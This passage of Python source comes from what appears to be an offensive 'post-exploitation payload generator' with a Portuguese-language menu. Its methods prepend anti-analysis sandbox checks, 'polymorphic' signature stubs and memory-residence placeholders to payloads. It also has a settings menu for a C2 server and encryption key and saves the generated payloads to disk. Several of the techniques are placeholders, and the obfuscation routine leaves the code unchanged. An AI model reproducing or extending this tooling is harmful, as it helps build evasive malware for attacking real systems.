            console.print(Panel.fit(
                f"[bold green]✅ PAYLOAD GERADO COM SUCESSO![/bold green]\n"
                f"[cyan]Arquivo:[/cyan] [bold]{file_path}[/bold]\n"
                f"[cyan]Tamanho:[/cyan] {os.path.getsize(file_path):,} bytes\n"
                f"[cyan]Plataforma:[/cyan] {plataforma.upper()}\n"
                f"[cyan]Módulos:[/cyan] {len(config['modulos'])} ativos\n"
                f"[cyan]Técnicas:[/cyan] {len(config['advanced_techniques'])} avançadas",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(f"[red]❌ Erro ao salvar arquivo: {str(e)}[/red]")
        
        if Confirm.ask("Mostrar localização do arquivo?"):
            console.print(f"[yellow]Localização: {os.path.abspath(file_path)}[/yellow]")
        
        input("\nPressione Enter para continuar...")

    def _aplicar_tecnica_avancada_melhorada(self, payload: str, tecnica: str, plataforma: str) -> str:
        """Aplica técnicas avançadas melhoradas"""
        if tecnica == 'polymorphic':
            return self._adicionar_polimorfismo(payload)
        elif tecnica == 'memory_resident':
            return self._adicionar_memory_resident(payload, plataforma)
        elif tecnica == 'antianalysis':
            return self._adicionar_antianalysis(payload)
        return payload

    def _adicionar_polimorfismo(self, payload: str) -> str:
        """Adiciona características polimórficas"""
        polimorfico = f"""
# Engine polimórfica - Gera assinatura única
{self._gerar_nome_aleatorio()}() {{
    # Assinatura única baseada em timestamp
    echo "signature_$(date +%s)_{random.randint(1000, 9999)}" > /dev/null
}}
"""
        return polimorfico + payload

    def _adicionar_memory_resident(self, payload: str, plataforma: str) -> str:
        """Técnicas de residência em memória"""
        if plataforma == 'windows':
            memory_code = """
# Técnica de residência em memória (Windows)
function Invoke-MemoryExecution {
    # Memory execution placeholder
    Write-Host "[+] Memory execution technique applied"
}
Invoke-MemoryExecution
"""
        else:
            memory_code = """
# Técnica de residência em memória (Linux/Android)
memory_resident() {
    # Memory resident execution technique
    echo "[+] Memory execution technique applied" > /dev/null
}
memory_resident
"""
        return memory_code + payload

    def _adicionar_antianalysis(self, payload: str) -> str:
        """Adiciona técnicas anti-análise"""
        antianalysis = """
# Técnicas anti-análise
anti_analysis() {
    # Detecta ambientes de análise/sandbox
    if [ -n "$SANDBOX" ] || [ -n "$DEBUG" ]; then
        echo "[!] Analysis environment detected"
        exit 0
    fi
}
anti_analysis
"""
        return antianalysis + payload

    def _ofuscar_codigo_avancado(self, payload: str, plataforma: str) -> str:
        """Ofuscação avançada de código"""
        if plataforma == 'windows':
            # Ofuscação básica para PowerShell
            lines = payload.split('\n')
            ofuscated = []
            for line in lines:
                if line.strip() and not line.strip().startswith('#'):
                    # Ofuscar variáveis simples
                    if '$' in line and '=' in line:
                        parts = line.split('=')
                        if len(parts) == 2:
                            var_name = parts[0].strip()
                            if not any(x in var_name for x in ['{', '}', '[', ']']):
                                ofuscated.append(line)
                                continue
                    ofuscated.append(line)
                else:
                    ofuscated.append(line)
            return '\n'.join(ofuscated)
        else:
            # Ofuscação básica para shell
            return payload

    def _preview_payload(self, payload: str, plataforma: str):
        """Mostra preview do payload"""
        console.print(Panel.fit(
            "[bold]👁️ PREVIEW DO PAYLOAD[/bold]",
            border_style="yellow"
        ))
        
        # Mostrar apenas as primeiras linhas
        lines = payload.split('\n')[:15]
        preview = '\n'.join(lines)
        
        if plataforma == 'windows':
            linguagem = "powershell"
        else:
            linguagem = "bash"
        
        console.print(Syntax(preview, linguagem, line_numbers=True))
        
        if len(payload.split('\n')) > 15:
            console.print("[yellow]... (visualização truncada)[/yellow]")

    def _mostrar_menu_configuracao_avancado(self):
        """Menu de configuração avançado"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold]⚙️ CONFIGURAÇÕES AVANÇADAS[/bold]",
                border_style="blue"
            ))
            
            console.print(f"1. Servidor C2: [cyan]{self.c2_server}[/cyan]")
            console.print(f"2. Chave de criptografia: [yellow]{self.encryption_key[:20]}...[/yellow]")
            console.print(f"3. Diretório de output: [green]{self.output_dir}[/green]")
            console.print("0. Voltar")
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3"],
                show_choices=False
            )
            
            if escolha == "1":
                novo_c2 = Prompt.ask("Novo servidor C2", default=self.c2_server)
                self.c2_server = novo_c2
            elif escolha == "2":
                nova_chave = Prompt.ask("Nova chave de criptografia", default=self.encryption_key)
                self.encryption_key = nova_chave
            elif escolha == "3":
                novo_dir = Prompt.ask("Novo diretório de output", default=self.output_dir)
                if not os.path.exists(novo_dir):
                    os.makedirs(novo_dir)
                self.output_dir = novo_dir
            elif escolha == "0":
                return

    def _sair_avancado(self):
        """Saída avançada do programa"""
        console.print(Panel.fit(
            "[bold green]🎯 OPERAÇÃO CONCLUÍDA![/bold green]",
            border_style="green"
        ))
        console.print(f"[cyan]Payloads salvos em: {os.path.abspath(self.output_dir)}[/cyan]")
        time.sleep(2)
        sys.exit(0)

    def executar(self):
        """Função principal executável"""
        try:
            self.mostrar_menu_principal()
        except KeyboardInterrupt:
            console.print("\n[yellow]Operação cancelada pelo usuário[/yellow]")
        except Exception as e:
            console.print(f"\n[red]Erro: {str(e)}[/red]")

def main():
    generator = AdvancedPostExploitationGenerator()
    generator.executar()

if __name__ == '__main__':
    main()
